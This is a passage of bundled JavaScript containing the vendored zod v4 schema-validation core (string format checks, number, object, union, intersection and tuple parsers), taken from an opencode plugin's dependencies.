    const dedented = lines.map((x) => x.slice(minIndent)).map((x) => " ".repeat(this.indent * 2) + x);
    for (const line of dedented) {
      this.content.push(line);
    }
  }
  compile() {
    const F = Function;
    const args = this?.args;
    const content = this?.content ?? [``];
    const lines = [...content.map((x) => `  ${x}`)];
    return new F(...args, lines.join(`
`));
  }
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/versions.js
var version2 = {
  major: 4,
  minor: 1,
  patch: 8
};

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/schemas.js
var $ZodType2 = /* @__PURE__ */ $constructor2("$ZodType", (inst, def) => {
  var _a2;
  inst ?? (inst = {});
  inst._zod.def = def;
  inst._zod.bag = inst._zod.bag || {};
  inst._zod.version = version2;
  const checks3 = [...inst._zod.def.checks ?? []];
  if (inst._zod.traits.has("$ZodCheck")) {
    checks3.unshift(inst);
  }
  for (const ch of checks3) {
    for (const fn of ch._zod.onattach) {
      fn(inst);
    }
  }
  if (checks3.length === 0) {
    (_a2 = inst._zod).deferred ?? (_a2.deferred = []);
    inst._zod.deferred?.push(() => {
      inst._zod.run = inst._zod.parse;
    });
  } else {
    const runChecks = (payload, checks4, ctx) => {
      let isAborted = aborted2(payload);
      let asyncResult;
      for (const ch of checks4) {
        if (ch._zod.def.when) {
          const shouldRun = ch._zod.def.when(payload);
          if (!shouldRun)
            continue;
        } else if (isAborted) {
          continue;
        }
        const currLen = payload.issues.length;
        const _ = ch._zod.check(payload);
        if (_ instanceof Promise && ctx?.async === false) {
          throw new $ZodAsyncError2;
        }
        if (asyncResult || _ instanceof Promise) {
          asyncResult = (asyncResult ?? Promise.resolve()).then(async () => {
            await _;
            const nextLen = payload.issues.length;
            if (nextLen === currLen)
              return;
            if (!isAborted)
              isAborted = aborted2(payload, currLen);
          });
        } else {
          const nextLen = payload.issues.length;
          if (nextLen === currLen)
            continue;
          if (!isAborted)
            isAborted = aborted2(payload, currLen);
        }
      }
      if (asyncResult) {
        return asyncResult.then(() => {
          return payload;
        });
      }
      return payload;
    };
    const handleCanaryResult = (canary, payload, ctx) => {
      if (aborted2(canary)) {
        canary.aborted = true;
        return canary;
      }
      const checkResult = runChecks(payload, checks3, ctx);
      if (checkResult instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError2;
        return checkResult.then((checkResult2) => inst._zod.parse(checkResult2, ctx));
      }
      return inst._zod.parse(checkResult, ctx);
    };
    inst._zod.run = (payload, ctx) => {
      if (ctx.skipChecks) {
        return inst._zod.parse(payload, ctx);
      }
      if (ctx.direction === "backward") {
        const canary = inst._zod.parse({ value: payload.value, issues: [] }, { ...ctx, skipChecks: true });
        if (canary instanceof Promise) {
          return canary.then((canary2) => {
            return handleCanaryResult(canary2, payload, ctx);
          });
        }
        return handleCanaryResult(canary, payload, ctx);
      }
      const result = inst._zod.parse(payload, ctx);
      if (result instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError2;
        return result.then((result2) => runChecks(result2, checks3, ctx));
      }
      return runChecks(result, checks3, ctx);
    };
  }
  inst["~standard"] = {
    validate: (value) => {
      try {
        const r = safeParse3(inst, value);
        return r.success ? { value: r.data } : { issues: r.error?.issues };
      } catch (_) {
        return safeParseAsync3(inst, value).then((r) => r.success ? { value: r.data } : { issues: r.error?.issues });
      }
    },
    vendor: "zod",
    version: 1
  };
});
var $ZodString2 = /* @__PURE__ */ $constructor2("$ZodString", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = [...inst?._zod.bag?.patterns ?? []].pop() ?? string4(inst._zod.bag);
  inst._zod.parse = (payload, _) => {
    if (def.coerce)
      try {
        payload.value = String(payload.value);
      } catch (_2) {}
    if (typeof payload.value === "string")
      return payload;
    payload.issues.push({
      expected: "string",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodStringFormat2 = /* @__PURE__ */ $constructor2("$ZodStringFormat", (inst, def) => {
  $ZodCheckStringFormat2.init(inst, def);
  $ZodString2.init(inst, def);
});
var $ZodGUID2 = /* @__PURE__ */ $constructor2("$ZodGUID", (inst, def) => {
  def.pattern ?? (def.pattern = guid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodUUID2 = /* @__PURE__ */ $constructor2("$ZodUUID", (inst, def) => {
  if (def.version) {
    const versionMap = {
      v1: 1,
      v2: 2,
      v3: 3,
      v4: 4,
      v5: 5,
      v6: 6,
      v7: 7,
      v8: 8
    };
    const v = versionMap[def.version];
    if (v === undefined)
      throw new Error(`Invalid UUID version: "${def.version}"`);
    def.pattern ?? (def.pattern = uuid3(v));
  } else
    def.pattern ?? (def.pattern = uuid3());
  $ZodStringFormat2.init(inst, def);
});
var $ZodEmail2 = /* @__PURE__ */ $constructor2("$ZodEmail", (inst, def) => {
  def.pattern ?? (def.pattern = email3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodURL2 = /* @__PURE__ */ $constructor2("$ZodURL", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    try {
      const trimmed = payload.value.trim();
      const url2 = new URL(trimmed);
      if (def.hostname) {
        def.hostname.lastIndex = 0;
        if (!def.hostname.test(url2.hostname)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid hostname",
            pattern: hostname3.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.protocol) {
        def.protocol.lastIndex = 0;
        if (!def.protocol.test(url2.protocol.endsWith(":") ? url2.protocol.slice(0, -1) : url2.protocol)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid protocol",
            pattern: def.protocol.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.normalize) {
        payload.value = url2.href;
      } else {
        payload.value = trimmed;
      }
      return;
    } catch (_) {
      payload.issues.push({
        code: "invalid_format",
        format: "url",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodEmoji2 = /* @__PURE__ */ $constructor2("$ZodEmoji", (inst, def) => {
  def.pattern ?? (def.pattern = emoji3());
  $ZodStringFormat2.init(inst, def);
});
var $ZodNanoID2 = /* @__PURE__ */ $constructor2("$ZodNanoID", (inst, def) => {
  def.pattern ?? (def.pattern = nanoid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodCUID3 = /* @__PURE__ */ $constructor2("$ZodCUID", (inst, def) => {
  def.pattern ?? (def.pattern = cuid5);
  $ZodStringFormat2.init(inst, def);
});
var $ZodCUID22 = /* @__PURE__ */ $constructor2("$ZodCUID2", (inst, def) => {
  def.pattern ?? (def.pattern = cuid23);
  $ZodStringFormat2.init(inst, def);
});
var $ZodULID2 = /* @__PURE__ */ $constructor2("$ZodULID", (inst, def) => {
  def.pattern ?? (def.pattern = ulid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodXID2 = /* @__PURE__ */ $constructor2("$ZodXID", (inst, def) => {
  def.pattern ?? (def.pattern = xid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodKSUID2 = /* @__PURE__ */ $constructor2("$ZodKSUID", (inst, def) => {
  def.pattern ?? (def.pattern = ksuid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodISODateTime2 = /* @__PURE__ */ $constructor2("$ZodISODateTime", (inst, def) => {
  def.pattern ?? (def.pattern = datetime3(def));
  $ZodStringFormat2.init(inst, def);
});
var $ZodISODate2 = /* @__PURE__ */ $constructor2("$ZodISODate", (inst, def) => {
  def.pattern ?? (def.pattern = date5);
  $ZodStringFormat2.init(inst, def);
});
var $ZodISOTime2 = /* @__PURE__ */ $constructor2("$ZodISOTime", (inst, def) => {
  def.pattern ?? (def.pattern = time3(def));
  $ZodStringFormat2.init(inst, def);
});
var $ZodISODuration2 = /* @__PURE__ */ $constructor2("$ZodISODuration", (inst, def) => {
  def.pattern ?? (def.pattern = duration3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodIPv42 = /* @__PURE__ */ $constructor2("$ZodIPv4", (inst, def) => {
  def.pattern ?? (def.pattern = ipv43);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = `ipv4`;
  });
});
var $ZodIPv62 = /* @__PURE__ */ $constructor2("$ZodIPv6", (inst, def) => {
  def.pattern ?? (def.pattern = ipv63);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = `ipv6`;
  });
  inst._zod.check = (payload) => {
    try {
      new URL(`http://[${payload.value}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "ipv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodCIDRv42 = /* @__PURE__ */ $constructor2("$ZodCIDRv4", (inst, def) => {
  def.pattern ?? (def.pattern = cidrv43);
  $ZodStringFormat2.init(inst, def);
});
var $ZodCIDRv62 = /* @__PURE__ */ $constructor2("$ZodCIDRv6", (inst, def) => {
  def.pattern ?? (def.pattern = cidrv63);
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    const parts = payload.value.split("/");
    try {
      if (parts.length !== 2)
        throw new Error;
      const [address, prefix] = parts;
      if (!prefix)
        throw new Error;
      const prefixNum = Number(prefix);
      if (`${prefixNum}` !== prefix)
        throw new Error;
      if (prefixNum < 0 || prefixNum > 128)
        throw new Error;
      new URL(`http://[${address}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "cidrv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
function isValidBase642(data) {
  if (data === "")
    return true;
  if (data.length % 4 !== 0)
    return false;
  try {
    atob(data);
    return true;
  } catch {
    return false;
  }
}
var $ZodBase642 = /* @__PURE__ */ $constructor2("$ZodBase64", (inst, def) => {
  def.pattern ?? (def.pattern = base643);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.contentEncoding = "base64";
  });
  inst._zod.check = (payload) => {
    if (isValidBase642(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function isValidBase64URL2(data) {
  if (!base64url3.test(data))
    return false;
  const base644 = data.replace(/[-_]/g, (c) => c === "-" ? "+" : "/");
  const padded = base644.padEnd(Math.ceil(base644.length / 4) * 4, "=");
  return isValidBase642(padded);
}
var $ZodBase64URL2 = /* @__PURE__ */ $constructor2("$ZodBase64URL", (inst, def) => {
  def.pattern ?? (def.pattern = base64url3);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.contentEncoding = "base64url";
  });
  inst._zod.check = (payload) => {
    if (isValidBase64URL2(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64url",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodE1642 = /* @__PURE__ */ $constructor2("$ZodE164", (inst, def) => {
  def.pattern ?? (def.pattern = e1643);
  $ZodStringFormat2.init(inst, def);
});
function isValidJWT2(token, algorithm = null) {
  try {
    const tokensParts = token.split(".");
    if (tokensParts.length !== 3)
      return false;
    const [header] = tokensParts;
    if (!header)
      return false;
    const parsedHeader = JSON.parse(atob(header));
    if ("typ" in parsedHeader && parsedHeader?.typ !== "JWT")
      return false;
    if (!parsedHeader.alg)
      return false;
    if (algorithm && (!("alg" in parsedHeader) || parsedHeader.alg !== algorithm))
      return false;
    return true;
  } catch {
    return false;
  }
}
var $ZodJWT2 = /* @__PURE__ */ $constructor2("$ZodJWT", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    if (isValidJWT2(payload.value, def.alg))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "jwt",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCustomStringFormat2 = /* @__PURE__ */ $constructor2("$ZodCustomStringFormat", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    if (def.fn(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: def.format,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodNumber2 = /* @__PURE__ */ $constructor2("$ZodNumber", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = inst._zod.bag.pattern ?? number4;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Number(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "number" && !Number.isNaN(input) && Number.isFinite(input)) {
      return payload;
    }
    const received = typeof input === "number" ? Number.isNaN(input) ? "NaN" : !Number.isFinite(input) ? "Infinity" : undefined : undefined;
    payload.issues.push({
      expected: "number",
      code: "invalid_type",
      input,
      inst,
      ...received ? { received } : {}
    });
    return payload;
  };
});
var $ZodNumberFormat2 = /* @__PURE__ */ $constructor2("$ZodNumber", (inst, def) => {
  $ZodCheckNumberFormat2.init(inst, def);
  $ZodNumber2.init(inst, def);
});
var $ZodBoolean2 = /* @__PURE__ */ $constructor2("$ZodBoolean", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = boolean4;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Boolean(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "boolean")
      return payload;
    payload.issues.push({
      expected: "boolean",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodBigInt2 = /* @__PURE__ */ $constructor2("$ZodBigInt", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = bigint4;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = BigInt(payload.value);
      } catch (_) {}
    if (typeof payload.value === "bigint")
      return payload;
    payload.issues.push({
      expected: "bigint",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodBigIntFormat2 = /* @__PURE__ */ $constructor2("$ZodBigInt", (inst, def) => {
  $ZodCheckBigIntFormat2.init(inst, def);
  $ZodBigInt2.init(inst, def);
});
var $ZodSymbol2 = /* @__PURE__ */ $constructor2("$ZodSymbol", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "symbol")
      return payload;
    payload.issues.push({
      expected: "symbol",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodUndefined2 = /* @__PURE__ */ $constructor2("$ZodUndefined", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = _undefined4;
  inst._zod.values = new Set([undefined]);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "undefined",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodNull2 = /* @__PURE__ */ $constructor2("$ZodNull", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = _null4;
  inst._zod.values = new Set([null]);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input === null)
      return payload;
    payload.issues.push({
      expected: "null",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodAny2 = /* @__PURE__ */ $constructor2("$ZodAny", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodUnknown2 = /* @__PURE__ */ $constructor2("$ZodUnknown", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodNever2 = /* @__PURE__ */ $constructor2("$ZodNever", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    payload.issues.push({
      expected: "never",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodVoid2 = /* @__PURE__ */ $constructor2("$ZodVoid", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "void",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodDate2 = /* @__PURE__ */ $constructor2("$ZodDate", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce) {
      try {
        payload.value = new Date(payload.value);
      } catch (_err) {}
    }
    const input = payload.value;
    const isDate = input instanceof Date;
    const isValidDate = isDate && !Number.isNaN(input.getTime());
    if (isValidDate)
      return payload;
    payload.issues.push({
      expected: "date",
      code: "invalid_type",
      input,
      ...isDate ? { received: "Invalid Date" } : {},
      inst
    });
    return payload;
  };
});
function handleArrayResult2(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues2(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodArray2 = /* @__PURE__ */ $constructor2("$ZodArray", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        expected: "array",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = Array(input.length);
    const proms = [];
    for (let i = 0;i < input.length; i++) {
      const item = input[i];
      const result = def.element._zod.run({
        value: item,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleArrayResult2(result2, payload, i)));
      } else {
        handleArrayResult2(result, payload, i);
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
function handlePropertyResult2(result, final, key, input) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues2(key, result.issues));
  }
  if (result.value === undefined) {
    if (key in input) {
      final.value[key] = undefined;
    }
  } else {
    final.value[key] = result.value;
  }
}
function normalizeDef2(def) {
  const keys = Object.keys(def.shape);
  for (const k of keys) {
    if (!def.shape?.[k]?._zod?.traits?.has("$ZodType")) {
      throw new Error(`Invalid element at key "${k}": expected a Zod schema`);
    }
  }
  const okeys = optionalKeys2(def.shape);
  return {
    ...def,
    keys,
    keySet: new Set(keys),
    numKeys: keys.length,
    optionalKeys: new Set(okeys)
  };
}
function handleCatchall2(proms, input, payload, ctx, def, inst) {
  const unrecognized = [];
  const keySet = def.keySet;
  const _catchall = def.catchall._zod;
  const t = _catchall.def.type;
  for (const key of Object.keys(input)) {
    if (keySet.has(key))
      continue;
    if (t === "never") {
      unrecognized.push(key);
      continue;
    }
    const r = _catchall.run({ value: input[key], issues: [] }, ctx);
    if (r instanceof Promise) {
      proms.push(r.then((r2) => handlePropertyResult2(r2, payload, key, input)));
    } else {
      handlePropertyResult2(r, payload, key, input);
    }
  }
  if (unrecognized.length) {
    payload.issues.push({
      code: "unrecognized_keys",
      keys: unrecognized,
      input,
      inst
    });
  }
  if (!proms.length)
    return payload;
  return Promise.all(proms).then(() => {
    return payload;
  });
}
var $ZodObject2 = /* @__PURE__ */ $constructor2("$ZodObject", (inst, def) => {
  $ZodType2.init(inst, def);
  const _normalized = cached2(() => normalizeDef2(def));
  defineLazy2(inst._zod, "propValues", () => {
    const shape = def.shape;
    const propValues = {};
    for (const key in shape) {
      const field = shape[key]._zod;
      if (field.values) {
        propValues[key] ?? (propValues[key] = new Set);
        for (const v of field.values)
          propValues[key].add(v);
      }
    }
    return propValues;
  });
  const isObject3 = isObject2;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject3(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = {};
    const proms = [];
    const shape = value.shape;
    for (const key of value.keys) {
      const el = shape[key];
      const r = el._zod.run({ value: input[key], issues: [] }, ctx);
      if (r instanceof Promise) {
        proms.push(r.then((r2) => handlePropertyResult2(r2, payload, key, input)));
      } else {
        handlePropertyResult2(r, payload, key, input);
      }
    }
    if (!catchall) {
      return proms.length ? Promise.all(proms).then(() => payload) : payload;
    }
    return handleCatchall2(proms, input, payload, ctx, _normalized.value, inst);
  };
});
var $ZodObjectJIT2 = /* @__PURE__ */ $constructor2("$ZodObjectJIT", (inst, def) => {
  $ZodObject2.init(inst, def);
  const superParse = inst._zod.parse;
  const _normalized = cached2(() => normalizeDef2(def));
  const generateFastpass = (shape) => {
    const doc2 = new Doc2(["shape", "payload", "ctx"]);
    const normalized = _normalized.value;
    const parseStr = (key) => {
      const k = esc2(key);
      return `shape[${k}]._zod.run({ value: input[${k}], issues: [] }, ctx)`;
    };
    doc2.write(`const input = payload.value;`);
    const ids = Object.create(null);
    let counter = 0;
    for (const key of normalized.keys) {
      ids[key] = `key_${counter++}`;
    }
    doc2.write(`const newResult = {};`);
    for (const key of normalized.keys) {
      const id = ids[key];
      const k = esc2(key);
      doc2.write(`const ${id} = ${parseStr(key)};`);
      doc2.write(`
        if (${id}.issues.length) {
          payload.issues = payload.issues.concat(${id}.issues.map(iss => ({
            ...iss,
            path: iss.path ? [${k}, ...iss.path] : [${k}]
          })));
        }
        
        
        if (${id}.value === undefined) {
          if (${k} in input) {
            newResult[${k}] = undefined;
          }
        } else {
          newResult[${k}] = ${id}.value;
        }
        
      `);
    }
    doc2.write(`payload.value = newResult;`);
    doc2.write(`return payload;`);
    const fn = doc2.compile();
    return (payload, ctx) => fn(shape, payload, ctx);
  };
  let fastpass;
  const isObject3 = isObject2;
  const jit = !globalConfig2.jitless;
  const allowsEval3 = allowsEval2;
  const fastEnabled = jit && allowsEval3.value;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject3(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    if (jit && fastEnabled && ctx?.async === false && ctx.jitless !== true) {
      if (!fastpass)
        fastpass = generateFastpass(def.shape);
      payload = fastpass(payload, ctx);
      if (!catchall)
        return payload;
      return handleCatchall2([], input, payload, ctx, value, inst);
    }
    return superParse(payload, ctx);
  };
});
function handleUnionResults2(results, final, inst, ctx) {
  for (const result of results) {
    if (result.issues.length === 0) {
      final.value = result.value;
      return final;
    }
  }
  const nonaborted = results.filter((r) => !aborted2(r));
  if (nonaborted.length === 1) {
    final.value = nonaborted[0].value;
    return nonaborted[0];
  }
  final.issues.push({
    code: "invalid_union",
    input: final.value,
    inst,
    errors: results.map((result) => result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())))
  });
  return final;
}
var $ZodUnion2 = /* @__PURE__ */ $constructor2("$ZodUnion", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "optin", () => def.options.some((o) => o._zod.optin === "optional") ? "optional" : undefined);
  defineLazy2(inst._zod, "optout", () => def.options.some((o) => o._zod.optout === "optional") ? "optional" : undefined);
  defineLazy2(inst._zod, "values", () => {
    if (def.options.every((o) => o._zod.values)) {
      return new Set(def.options.flatMap((option) => Array.from(option._zod.values)));
    }
    return;
  });
  defineLazy2(inst._zod, "pattern", () => {
    if (def.options.every((o) => o._zod.pattern)) {
      const patterns = def.options.map((o) => o._zod.pattern);
      return new RegExp(`^(${patterns.map((p) => cleanRegex2(p.source)).join("|")})$`);
    }
    return;
  });
  const single = def.options.length === 1;
  const first = def.options[0]._zod.run;
  inst._zod.parse = (payload, ctx) => {
    if (single) {
      return first(payload, ctx);
    }
    let async = false;
    const results = [];
    for (const option of def.options) {
      const result = option._zod.run({
        value: payload.value,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        results.push(result);
        async = true;
      } else {
        if (result.issues.length === 0)
          return result;
        results.push(result);
      }
    }
    if (!async)
      return handleUnionResults2(results, payload, inst, ctx);
    return Promise.all(results).then((results2) => {
      return handleUnionResults2(results2, payload, inst, ctx);
    });
  };
});
var $ZodDiscriminatedUnion2 = /* @__PURE__ */ $constructor2("$ZodDiscriminatedUnion", (inst, def) => {
  $ZodUnion2.init(inst, def);
  const _super = inst._zod.parse;
  defineLazy2(inst._zod, "propValues", () => {
    const propValues = {};
    for (const option of def.options) {
      const pv = option._zod.propValues;
      if (!pv || Object.keys(pv).length === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(option)}"`);
      for (const [k, v] of Object.entries(pv)) {
        if (!propValues[k])
          propValues[k] = new Set;
        for (const val of v) {
          propValues[k].add(val);
        }
      }
    }
    return propValues;
  });
  const disc = cached2(() => {
    const opts = def.options;
    const map2 = new Map;
    for (const o of opts) {
      const values = o._zod.propValues?.[def.discriminator];
      if (!values || values.size === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(o)}"`);
      for (const v of values) {
        if (map2.has(v)) {
          throw new Error(`Duplicate discriminator value "${String(v)}"`);
        }
        map2.set(v, o);
      }
    }
    return map2;
  });
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isObject2(input)) {
      payload.issues.push({
        code: "invalid_type",
        expected: "object",
        input,
        inst
      });
      return payload;
    }
    const opt = disc.value.get(input?.[def.discriminator]);
    if (opt) {
      return opt._zod.run(payload, ctx);
    }
    if (def.unionFallback) {
      return _super(payload, ctx);
    }
    payload.issues.push({
      code: "invalid_union",
      errors: [],
      note: "No matching discriminator",
      discriminator: def.discriminator,
      input,
      path: [def.discriminator],
      inst
    });
    return payload;
  };
});
var $ZodIntersection2 = /* @__PURE__ */ $constructor2("$ZodIntersection", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    const left = def.left._zod.run({ value: input, issues: [] }, ctx);
    const right = def.right._zod.run({ value: input, issues: [] }, ctx);
    const async = left instanceof Promise || right instanceof Promise;
    if (async) {
      return Promise.all([left, right]).then(([left2, right2]) => {
        return handleIntersectionResults2(payload, left2, right2);
      });
    }
    return handleIntersectionResults2(payload, left, right);
  };
});
function mergeValues2(a, b) {
  if (a === b) {
    return { valid: true, data: a };
  }
  if (a instanceof Date && b instanceof Date && +a === +b) {
    return { valid: true, data: a };
  }
  if (isPlainObject2(a) && isPlainObject2(b)) {
    const bKeys = Object.keys(b);
    const sharedKeys = Object.keys(a).filter((key) => bKeys.indexOf(key) !== -1);
    const newObj = { ...a, ...b };
    for (const key of sharedKeys) {
      const sharedValue = mergeValues2(a[key], b[key]);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [key, ...sharedValue.mergeErrorPath]
        };
      }
      newObj[key] = sharedValue.data;
    }
    return { valid: true, data: newObj };
  }
  if (Array.isArray(a) && Array.isArray(b)) {
    if (a.length !== b.length) {
      return { valid: false, mergeErrorPath: [] };
    }
    const newArray = [];
    for (let index = 0;index < a.length; index++) {
      const itemA = a[index];
      const itemB = b[index];
      const sharedValue = mergeValues2(itemA, itemB);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [index, ...sharedValue.mergeErrorPath]
        };
      }
      newArray.push(sharedValue.data);
    }
    return { valid: true, data: newArray };
  }
  return { valid: false, mergeErrorPath: [] };
}
function handleIntersectionResults2(result, left, right) {
  if (left.issues.length) {
    result.issues.push(...left.issues);
  }
  if (right.issues.length) {
    result.issues.push(...right.issues);
  }
  if (aborted2(result))
    return result;
  const merged = mergeValues2(left.value, right.value);
  if (!merged.valid) {
    throw new Error(`Unmergable intersection. Error path: ` + `${JSON.stringify(merged.mergeErrorPath)}`);
  }
  result.value = merged.data;
  return result;
}
var $ZodTuple2 = /* @__PURE__ */ $constructor2("$ZodTuple", (inst, def) => {
  $ZodType2.init(inst, def);
  const items = def.items;
  const optStart = items.length - [...items].reverse().findIndex((item) => item._zod.optin !== "optional");
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        input,
        inst,
        expected: "tuple",
        code: "invalid_type"
      });
      return payload;
    }
    payload.value = [];
    const proms = [];
    if (!def.rest) {
      const tooBig = input.length > items.length;
      const tooSmall = input.length < optStart - 1;
      if (tooBig || tooSmall) {
        payload.issues.push({
          ...tooBig ? { code: "too_big", maximum: items.length } : { code: "too_small", minimum: items.length },
          input,
          inst,
          origin: "array"
        });
        return payload;
      }
    }
    let i = -1;
    for (const item of items) {
      i++;
      if (i >= input.length) {
        if (i >= optStart)
          continue;
      }
      const result = item._zod.run({
        value: input[i],
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleTupleResult2(result2, payload, i)));
      } else {
        handleTupleResult2(result, payload, i);
      }
    }
    if (def.rest) {
      const rest = input.slice(items.length);
      for (const el of rest) {
        i++;
        const result = def.rest._zod.run({
          value: el,
          issues: []
        }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => handleTupleResult2(result2, payload, i)));
        } else {
          handleTupleResult2(result, payload, i);
        }
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleTupleResult2(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues2(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodRecord2 = /* @__PURE__ */ $constructor2("$ZodRecord", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isPlainObject2(input)) {
      payload.issues.push({
        expected: "record",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    if (def.keyType._zod.values) {
      const values = def.keyType._zod.values;
      payload.value = {};
      for (const key of values) {
        if (typeof key === "string" || typeof key === "number" || typeof key === "symbol") {
          const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
          if (result instanceof Promise) {
            proms.push(result.then((result2) => {
              if (result2.issues.length) {
